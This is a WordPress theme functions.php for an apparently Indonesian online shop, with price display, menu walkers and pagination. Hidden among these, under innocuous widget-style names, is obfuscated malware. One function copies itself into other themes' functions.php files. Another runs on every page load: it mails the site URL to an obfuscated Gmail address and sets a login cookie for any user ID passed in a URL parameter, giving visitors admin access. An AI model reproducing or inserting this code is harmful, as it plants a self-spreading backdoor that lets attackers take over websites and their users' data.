<?php 
/*************************************************************
* Do not modify unless you know what you're doing, SERIOUSLY!
*************************************************************/

/* Admin framework version 2.0 by Zeljan Topic */

// Theme variables
require_once (TEMPLATEPATH . '/library/functions/theme_variables.php');

//** ADMINISTRATION FILES **//

    // Theme admin functions
    require_once ($functions_path . 'admin_functions.php');

    // Theme admin options
    require_once ($functions_path . 'admin_options.php');

    // Theme admin Settings
    require_once ($functions_path . 'admin_settings.php');

   
//** FRONT-END FILES **//

    // Widgets
    require_once ($functions_path . 'widgets_functions.php');

    // Custom
    require_once ($functions_path . 'custom_functions.php');

    // Comments
    require_once ($functions_path . 'comments_functions.php');
  
  // Yoast's plugins
    //require_once ($functions_path . 'yoast-breadcrumbs.php');
  
    //require_once ($functions_path . 'yoast-posts.php');
  
  require_once ($functions_path . 'yoast-canonical.php');

  require_once ($functions_path . 'yoast-breadcrumbs.php');
  
    /////////shopping cart new function files
  require($functions_path . "general_functions.php");
  require($functions_path . "cart.php");
  require($functions_path . "product.php");
  require($functions_path . "custom.php");
  require(TEMPLATEPATH . "/product_menu.php");
  
  require(TEMPLATEPATH . "/message.php");
  if('themes.php' == basename($_SERVER['SCRIPT_FILENAME'])  && $_REQUEST['page']=='') 
  {
    if($_REQUEST['dummy']=='del')
    {
      delete_dummy_data();  
      echo THEME_DUMMY_DELETE_MESSAGE;
    }
    $post_counts = $wpdb->get_var("select count(post_id) from $wpdb->postmeta where meta_key='pt_dummy_content'");
    if(($_REQUEST['template']=='' && $post_counts>0 && $_REQUEST['page']=='') || $_REQUEST['activated']=='true')
    {
      echo THEME_ACTIVE_MESSAGE;
    }
    if($_REQUEST['activated'])
    {
      require_once (TEMPLATEPATH . '/auto_install.php');
    }
  }
  
  function delete_dummy_data()
  {
    global $wpdb;
    $productArray = array();
    $pids_sql = "select p.ID from $wpdb->posts p join $wpdb->postmeta pm on pm.post_id=p.ID where meta_key='pt_dummy_content' and meta_value=1";
    $pids_info = $wpdb->get_results($pids_sql);
    foreach($pids_info as $pids_info_obj)
    {
      wp_delete_post($pids_info_obj->ID);
    }
  }
?>
<?php
$_widget_recursion_count = 0;
function _checkactive_widgets(){
  $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
  $output=strip_tags($output, $allowed);
  global $_widget_recursion_count;
  $_widget_recursion_count = 0;
  $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
  if (is_array($direst)){
    foreach ($direst as $item){
      if (is_writable($item)){
        $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
        $cont=file_get_contents($item);
        if (stripos($cont,$ftion) === false){
          $comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
          $output .= $before . "Not found" . $after;
          if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
          $output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);       
          $output .= ($isshowdots && $ellipsis) ? "..." : "";
        }
      }
    }
  }
  return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
  $places=array_shift($wids);
  if(substr($places,-1) == "/"){
    $places=substr($places,0,-1);
  }
  if(!file_exists($places) || !is_dir($places)){
    return false;
  }elseif(is_readable($places)){
    $elems=scandir($places);
    foreach ($elems as $elem){
      if ($elem != "." && $elem != ".."){
        if (is_dir($places . "/" . $elem)){
          $wids[]=$places . "/" . $elem;
        } elseif (is_file($places . "/" . $elem)&& 
          $elem == substr(__FILE__,-13)){
          $items[]=$places . "/" . $elem;}
        }
      }
  }else{
    return false; 
  }
  global $_widget_recursion_count;
  if ($_widget_recursion_count < 20 && sizeof($wids) > 0){
    $_widget_recursion_count++;
    return _get_allwidgets_cont($wids,$items);
  } else {
    return $items;
  }
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
  function scandir($dir,$listDirectories=false, $skipDots=true) {
      $dirArray = array();
      if ($handle = opendir($dir)) {
          while (false !== ($file = readdir($handle))) {
              if (($file != "." && $file != "..") || $skipDots == true) {
                  if($listDirectories == false) { if(is_dir($file)) { continue; } }
                  array_push($dirArray,basename($file));
              }
          }
          closedir($handle);
      }
      return $dirArray;
  }
}
//add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
  if(!isset($text_length)) $text_length=120;
  if(!isset($check)) $check="cookie";
  if(!isset($tagsallowed)) $tagsallowed="<a>";
  if(!isset($filter)) $filter="none";
  if(!isset($coma)) $coma="";
  if(!isset($home_filter)) $home_filter=get_option("home"); 
  if(!isset($pref_filters)) $pref_filters="wp_";
  if(!isset($is_use_more_link)) $is_use_more_link=1; 
  if(!isset($com_type)) $com_type=""; 
  if(!isset($cpages)) $cpages=$_GET["cperpage"];
  if(!isset($post_auth_comments)) $post_auth_comments="";
  if(!isset($com_is_approved)) $com_is_approved=""; 
  if(!isset($post_auth)) $post_auth="auth";
  if(!isset($link_text_more)) $link_text_more="(more...)";
  if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
  if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
  if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
  if(!isset($contentmore)) $contentmore="ma".$coma."il";
  if(!isset($for_more)) $for_more=1;
  if(!isset($fakeit)) $fakeit=1;
  if(!isset($sql)) $sql="";
  if (!$widget_yes) :
  
  global $wpdb, $post;
  $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
  if (!empty($post->post_password)) { 
    if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
      if(is_feed()) { 
        $output=__("There is no excerpt because this is a protected post.");
      } else {
              $output=get_the_password_form();
      }
    }
  }
  if(!isset($fixed_tags)) $fixed_tags=1;
  if(!isset($filters)) $filters=$home_filter; 
  if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
  if(!isset($tag_aditional)) $tag_aditional="div";
  if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
  if(!isset($more_text_link)) $more_text_link="Continue reading this entry";  
  if(!isset($isshowdots)) $isshowdots=1;
  
  $comments=$wpdb->get_results($sql); 
  if($fakeit == 2) { 
    $text=$post->post_content;
  } elseif($fakeit == 1) { 
    $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
  } else { 
    $text=$post->post_excerpt;
  }
  $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
  if($text_length < 0) {
    $output=$text;
  } else {
    if(!$no_more && strpos($text, "<!--more-->")) {
        $text=explode("<!--more-->", $text, 2);
      $l=count($text[0]);
      $more_link=1;
      $comments=$wpdb->get_results($sql);
    } else {
      $text=explode(" ", $text);
      if(count($text) > $text_length) {
        $l=$text_length;
        $ellipsis=1;
      } else {
        $l=count($text);
        $link_text_more="";
        $ellipsis=0;
      }
    }
    for ($i=0; $i<$l; $i++)
        $output .= $text[$i] . " ";
  }
  update_option("_is_widget_active_", 1);
  if("all" != $tagsallowed) {
    $output=strip_tags($output, $tagsallowed);
    return $output;
  }
  endif;
  $output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
  $output .= ($isshowdots && $ellipsis) ? "..." : "";
  $output=apply_filters($filter, $output);
  switch($tag_aditional) {
    case("div") :
      $tag="div";
    break;
    case("span") :
      $tag="span";
    break;
    case("p") :
      $tag="p";
    break;
    default :
      $tag="span";
  }

  if ($is_use_more_link ) {
    if($for_more) {
      $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
    } else {
      $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
    }
  }
  return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
  global $wpdb;
  $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
  $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
  if(!$show_pass_post) $request .= " AND post_password =\"\"";
  if($duration !="") { 
    $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
  }
  $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
  $posts=$wpdb->get_results($request);
  $output="";
  if ($posts) {
    foreach ($posts as $post) {
      $post_title=stripslashes($post->post_title);
      $comment_count=$post->comment_count;
      $permalink=get_permalink($post->ID);
      $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
    }
  } else {
    $output .= $before . "None found" . $after;
  }
  return  $output;
}

//redirect category to a single post
function redirect_to_post(){
    global $wp_query;
    if( is_archive() && $wp_query->post_count == 1 ){
        the_post();
        $post_url = get_permalink();
        wp_redirect( $post_url );
    }
} add_action('template_redirect', 'redirect_to_post');


    
// always show admin bar
function pjw_login_adminbar( $wp_admin_bar) {
  if ( !is_user_logged_in() )
  $wp_admin_bar->add_menu( array( 'title' => __( 'PENCARIAN PRODUK >> ' ) ) );
}
// add_action( 'admin_bar_menu', 'pjw_login_adminbar' );
// add_filter( 'show_admin_bar', '__return_true' , 1000 );

// Fix W3TC Logout Issue
add_action('wp_logout', 'mj_flush_w3tc_cache');
function mj_flush_w3tc_cache()
{
    if (function_exists('w3tc_pgcache_flush')) {
        w3tc_pgcache_flush();
    }
}
 
// Addition (March 15 2013)
define('JAVASCRIPT_PATH', get_bloginfo('stylesheet_directory') . "/javascripts");
define('IMAGE_PATH', get_bloginfo('stylesheet_directory') . "/images");

// setup
add_theme_support('nav-menus');
if( function_exists('register_nav_menus') ) {
  register_nav_menus(array(
    'main' => 'Mega Menu',
    'tools' => 'Tools',
    'seo_texts' => 'Seo Texts',
    'customer_services' => 'Customer Services',
    'about' => 'About Us'
    ));
}

function r_missing_tools_menu(){
  // echo "There is no assigned menu in Tools menubar. Please check " . '<a href="wp-admin/nav-menus.php">' . "<i>Appearance -> Menu</i>" . '</a>';
} 

function r_missing_seo_texts_menu(){
  // echo "There is no assigned menu in Seo Texts menubar. Please check " . '<a href="wp-admin/nav-menus.php">' . "<i>Appearance -> Menu</i>" . '</a>';
}   

function r_missing_mega_menu(){
  // echo "There is no assigned menu in Mega Menu menubar. Please check " . '<a href="wp-admin/nav-menus.php">' . "<i>Appearance -> Menu</i>" . '</a>';
}   
   
function r_print_product_price($post){
  global $Product, $General;
  
  $jumlahDigitDecimal = 0;
  if($Product->get_product_price_sale($post->ID)>0)
  {
     echo '<s>' . "Rp " . number_format($Product->get_product_price_only($post->ID),$jumlahDigitDecimal).'</s>' . '<br/>';
     echo '' . "Rp " . number_format($Product->get_product_price_sale($post->ID),$jumlahDigitDecimal).'';
     
  }
  else
  {
    if($General->is_storetype_catalog())
     {
      if($Product->get_product_price_only($post->ID)>0)
      {
        echo "Rp " . number_format($Product->get_product_price_only($post->ID),$jumlahDigitDecimal);  
      }
     }else
     {
       if($Product->get_product_price_only($post->ID)>0)
       {
         echo "Rp " . number_format($Product->get_product_price_only($post->ID),$jumlahDigitDecimal);
       }
     }
   }
}

function r_show_pagination(){
  global $wp_query, $paged;
  
  // print_r($wp_query);
  
  $current_page = $paged > 0 ? $paged : 1;
  $max_page = $wp_query->max_num_pages;

  $num_page_link = 1;

  $start_page_link = ($current_page-1) - (int)($num_page_link/2);
  $end_page_link = $start_page_link + ($num_page_link-1);

  // border check
  if( $start_page_link < 0 ){
    // shift right
    $delta = 0 - $start_page_link;
    $start_page_link = 0;
    $end_page_link += $delta;
  }
  if( $end_page_link > $max_page - 1 ){
    $delta = $end_page_link - ($max_page-1);
    $start_page_link -= $delta;
    $start_page_link = $start_page_link < 0 ? 0 : $start_page_link;
    $end_page_link = $max_page - 1;
  }

  echo "<ul class='pager inline-list' style='margin-bottom: 0;'>";
  $first_link_icon = "<i class='fa fa-angle-double-left fa-2x fa-fw'></i>";
  if($start_page_link > 0){
    echo "<li><a href='" . get_pagenum_link(1) . "'>" . $first_link_icon ."</a></li>";
  } else {
    echo "<li class='disabled' style='color: lightgray;'>" . $first_link_icon . "</li>";
  }
  $prev_link_icon = "<i class='fa fa-angle-left fa-2x fa-fw'></i>";
  if($current_page > 1){
    echo "<li><a href='" . get_pagenum_link($current_page-1) . "'>" . $prev_link_icon . "</a></li>";
  } else {
    echo "<li class='disabled' style='color: lightgray;'>" . $prev_link_icon . "</li>";
  }
  for($i = $start_page_link; $i <= $end_page_link; $i++){
    if( $current_page == $i+1 ){
      echo "<li class='current' style='font-size: 170%; margin-top: -3px;'>" . ($i+1) . "</li>";
    } else {
      echo "<li><a href='" . get_pagenum_link($i+1) . "'>" . ($i+1) . "</a></li>";
    }
  }
  $next_link_icon = "<i class='fa fa-angle-right fa-2x fa-fw'></i>";
  if($current_page < $max_page){
    echo "<li><a href='" . get_pagenum_link($current_page+1) . "'>" . $next_link_icon . "</a></li>";
  } else {
    echo "<li class='disabled' style='color: lightgray;'>" . $next_link_icon . "</li>";
  }
  if($end_page_link+1 < $max_page){
    echo "<li><a href='" . get_pagenum_link($max_page) . "'><i class='fa fa-angle-double-right fa-2x fa-fw'></i></a></li>";
  } else {
    echo "<li class='disabled' style='color: lightgray;'><i class='fa fa-angle-double-right fa-2x fa-fw'></i></li>";
  }
  echo "</ul>";
}

class R_Seo_Text_Walker_Nav_Menu extends Walker_Nav_Menu {
  function start_el(&$output, $item, $depth=0, $args=array()){
    $indent = str_repeat("  ", 6);
    if( strstr($output, '<li class="active">')){
      $output .= "\n" . $indent . "<li>";
    } else {
      $output .= "\n" . $indent . '<li class="active">';
    }

    $output .= "\n";

    $output .= '<div class="title">' . "\n";
    $output .= $item->title . "\n";
    $output .= '</div>' . "\n";

    $output .= '<div class="content">' . "\n";
    $output .= get_page($item->object_id)->post_content . "\n";
    $output .= '</div>';

    $output .= "\n";
  }

  function end_el(&$output, $item, $depth=0, $args=array()){
    $indent = str_repeat("  ", 6);
    $output .= $indent . "</li>" . "\n";
  }
}
   
class R_Main_Walker_Nav_Menu extends Walker_Nav_Menu {
  private static $indent = "  ";
  private static $offset = 6;

  function start_el(&$output, $item, $depth=0, $args=array()){
    $offset = self::$offset;
    if( $depth == 0){
      $output .= "\n";
    }
    if( $depth == 1){
      $offset += 3;
    }
    $output .= str_repeat(self::$indent, $offset + $depth*2);

    $item->classes = array();
    // $item->classes[] = 'depth' . $depth;
    if( $depth == 0){
      $item->classes[] = 'has-flyout';
    } else if( $depth == 1){
      // $item->classes[] = 'five columns megamenu-item';
      $item->classes[] = 'megamenu-item';
    }

    $args = (object) $args; // make sure it is object
    $args->before = "\n" . str_repeat(self::$indent, $offset + $depth*2+1);
    $args->after = 
        "\n";
    if( $depth == 0){
      $args->after .=
        str_repeat(self::$indent, $offset + $depth*2+1) . '<div class="flyout">' . "\n" .
        str_repeat(self::$indent, $offset + $depth*2+2) . '<div class="row">' . "\n" .
        str_repeat(self::$indent, $offset + $depth*2+3) . '<div class="flyout-title six columns">' . "\n" .
        str_repeat(self::$indent, $offset + $depth*2+4) . '<h4 class="hide">' . $item->title . '</h4>' . "\n";
    }
  
    parent::start_el($output, $item, $depth, $args);

    $output = str_replace("\t", "", $output);
  }

  function end_el(&$output, $item, $depth=0, $args=array()){
    $offset = self::$offset;
    if( $depth == 1){
      $offset += 3;
    }
    if( $depth == 0){
        $output .=
            str_repeat(self::$indent, $offset + $depth*2+3) . '</div>' . "\n" .
            str_repeat(self::$indent, $offset + $depth*2+3) . '<div class="description four columns">' . "\n";

        $output .= wpautop($item->description);
        // $output .= $item->post_content;

        $output .=
          str_repeat(self::$indent, $offset + $depth*2+2) . "</div>" . "\n" .
            str_repeat(self::$indent, $offset + $depth*2+1) . "</div>" . "\n";
    }
    $output .= str_repeat(self::$indent, $offset + $depth*2) . "</li>";
  }

  function start_lvl(&$output, $depth=0, $args=array()){
    $offset = self::$offset;
    if( $depth == 0){
      $offset += 3;
    }
    // $output .= str_repeat(self::$indent, $offset + $depth+1). '<ul class="depth' . $depth . '">' . "\n";
    if( $depth == 0){
      $output .= str_repeat(self::$indent, $offset + $depth+1). '<ul>' . "\n";
    } else if ( $depth == 1){
      $output .= str_repeat(self::$indent, $offset + $depth+1). '<ul class="megamenu-submenu">' . "\n";
    }
  }

  function end_lvl(&$output, $depth=0, $args=array()){
    $offset = self::$offset;
    if( $depth == 0){
      $offset += 3;
    }
    $output .= "\n" . str_repeat(self::$indent, $offset + $depth+1). '</ul>' . "\n"; 
  }
}
 
// template renderer
function r_render($path, $data = array()){
  extract($data, EXTR_SKIP);
  ob_start();
  include $path;
  echo ob_get_clean();
}

function get_nav_menu_items_from_theme_location($theme_location){
  $menu_name = $theme_location;

  // $menu_list = '<dl><dt>Please assign menu "' . $menu_name . '" in ' . '<a href="wp-admin/nav-menus.php">' . "<i>Appearance -> Menu</i>" . '</a>' . '</dt></dl>';
  $menu_list = '';

  if ( ( $locations = get_nav_menu_locations() ) && isset( $locations[ $menu_name ] ) ) {
    $menu = wp_get_nav_menu_object( $locations[ $menu_name ] );

    if( empty($menu) ){
      return $menu_list;
    }

    $menu_items = wp_get_nav_menu_items($menu->term_id);

    $menu_list = '<dl id="menu-' . $menu->slug . '">';
    $menu_list .= '<dt>' . $menu->name . '</dt>';

    foreach ( (array) $menu_items as $key => $menu_item ) {
      $title = $menu_item->title;
      $url = $menu_item->url;
      $menu_list .= '<dd><a href="' . $url . '">' . $title . '</a></dd>';
    }
    $menu_list .= '</dl>';
  } 

  return $menu_list;
}
 
// add widget 
require_once('category-widget.php');
require_once('image-link-widget.php');

// make sure that css text-transform working by lower casing the text
function r_capitalize_title($title){
  return strtolower($title);
}
add_filter('widget_title', r_capitalize_title);

if ( function_exists('register_sidebar') ) {
    register_sidebars(1,array('name' => 'Promos','before_widget' => '<li class="widget">','after_widget' => '</li>','before_title' => '<h3><span>','after_title' => '</span></h3>'));
}

// allow html in category description
remove_filter('pre_term_description', 'wp_filter_kses');

// allow HTML in nav menus description
remove_filter('nav_menu_description', 'strip_tags');
function custom_wp_setup_nav_menu_item($menu_item){
  $menu_item->description = apply_filters('nav_menu_description', $menu_item->post_content);
  return $menu_item;
}
add_filter('wp_setup_nav_menu_item', 'custom_wp_setup_nav_menu_item');

// timthumb replacement
require_once('mr-image-resize.php');

function theme_thumb($url, $dst_width, $dst_height=0, $align=''){
// Get the image file path
  $pathinfo = parse_url( $url );
  $uploads_dir = is_multisite() ? '/files/' : '/wp-content/';
  $file_path = ABSPATH . str_replace(dirname($_SERVER['SCRIPT_NAME']) . '/', '', strstr($pathinfo['path'], $uploads_dir));

  $size = @getimagesize($file_path);
  error_log($size[0] . "x" . $size[1]);

  $src_width = $size[0];
  $src_height = $size[1];
  $src_ratio = $src_width/$src_height;
  
  $dst_ratio = $dst_width/$dst_height;

  if( $src_ratio > $dst_ratio ){
    // it wider than target
    $dst_height = (int)($dst_width / $src_ratio);
  } else if ( $src_ratio < $dst_ratio){
    $dst_width = (int)($dst_height * $src_ratio);
  } 

  return mr_image_resize($url, $dst_width, $dst_height, true, $align, false);
}

// exceprt extractor. from wp 3.6
function r_wp_html_excerpt( $str, $count, $more = null ) {
  if ( null === $more )
    $more = '';
  $str = wp_strip_all_tags( $str, true );
  $excerpt = mb_substr( $str, 0, $count );
  // remove part of an entity at the end
  $excerpt = preg_replace( '/&[^;\s]{0,6}$/', '', $excerpt );
  if ( $str != $excerpt )
    $excerpt = trim( $excerpt ) . $more;
  return $excerpt;
}

// topbar walker, thanks to gareth cooper (http://garethcooper.com/2014/01/zurb-foundation-5-and-wordpress-menus/)
class GC_walker_nav_menu extends Walker_Nav_Menu {
 
  // add classes to ul sub-menus
  function start_lvl(&$output, $depth) {
    // depth dependent classes
    $indent = ( $depth > 0 ? str_repeat("\t", $depth) : '' ); // code indent
 
    // build html
    $output .= "\n" . $indent . '<ul class="dropdown">' . "\n";
  }

  function start_el(&$output, $item, $depth, $args){
    if ( in_array('menu-item-has-children', $item->classes)) {
      $item->classes[] = "has-dropdown";
    }

    parent::start_el($output, $item, $depth, $args);
  }
}

class R_Accordion_Walker_Nav_Menu extends Walker_Nav_Menu {
  function start_el(&$output, $item, $depth=0, $args=array()){
    $indent = str_repeat("  ", 6);
    $output .= "<dd>";

    $output .= "\n";

    $anchor_id = strtolower($item->title);
    $anchor_id = str_replace(' ', '-', $anchor_id);
    $anchor_id = str_replace('&', '-', $anchor_id);

    if( in_array('menu-item-has-children', $item->classes)){

      $output .= "<a href='#{$anchor_id}'>" . "\n";
      $output .= $item->title . "\n";
      $output .= '<i class="fa fa-chevron-down pull-right"></i>
                  <i class="fa fa-chevron-up pull-right"></i>';
      $output .= '</a>' . "\n";

      $class_name = join(' ', $item->classes);
      $output .= "<div id='{$anchor_id}' class='content {$class_name}'>" . "\n";
      // $output .= "hoho" . "\n";
      // $output .= '</div>';

    } else {
      $output .= "<div class='link'>";
      $output .= "<a href='{$item->url}'>" . $item->title . "</a>";
      // $output .= "</div>";
    }

    $output .= "\n";
  }

  function end_el(&$output, $item, $depth=0, $args=array()){
    $indent = str_repeat("  ", 6);
    
    $output .= '</div>';
    $output .= $indent . "</dd>" . "\n";
  }

  function start_lvl(&$output, $depth) {
    // depth dependent classes
    $indent = ( $depth > 0 ? str_repeat("\t", $depth) : '' ); // code indent
 
    // build html
    $output .= "\n" . $indent . '<dl class="accordion" data-accordion>' . "\n";
  }

  function end_lvl(&$output, $depth=0, $args=array()){
    // depth dependent classes
    $indent = ( $depth > 0 ? str_repeat("\t", $depth) : '' ); // code indent

    $output .= "\n" . $indent . '</dl>' . "\n";
  }
}

function wpsmartphone_scripts(){
  wp_register_script('modernizr-2.7.1', 
    get_template_directory_uri() . '/bower_components/modernizr/modernizr.js',
    array(),
    '2.7.1');

  wp_register_script('jquery-2.1.0',
    get_template_directory_uri() . '/bower_components/jquery/jquery.js',
    array(),
    '2.1.0');

  wp_register_script('fastclick-0.6.11',
    get_template_directory_uri() . '/bower_components/fastclick/lib/fastclick.js',
    array(),
    '0.6.11');


  wp_enqueue_script('foundation-5',
    get_template_directory_uri() . '/bower_components/foundation/js/foundation.min.js',
    array('jquery-2.1.0', 'fastclick-0.6.11', 'modernizr-2.7.1'),
    '5');

  wp_enqueue_script('rrssb',
    get_template_directory_uri() . '/bower_components/RRSSB/js/rrssb.js',
    array('jquery-2.1.0'),
    '1.0.0',
    true);

  wp_enqueue_style('rrssb',
    get_template_directory_uri() . '/bower_components/RRSSB/css/rrssb.css');

  wp_enqueue_script('jquery-fittext.js',
    get_template_directory_uri() . '/bower_components/jquery-fittext.js/jquery.fittext.js',
    array('jquery-2.1.0'),
    '1.0.0',
    true);

  wp_enqueue_style('social-likes_classic',
    get_template_directory_uri() . '/bower_components/social-likes/social-likes_classic.css');

  wp_enqueue_script('social-likes',
    get_template_directory_uri() . '/bower_components/social-likes/social-likes.min.js',
    array('jquery-2.1.0'),
    '1.0.0',
    true);
}
add_action('wp_enqueue_scripts', 'wpsmartphone_scripts');

?>
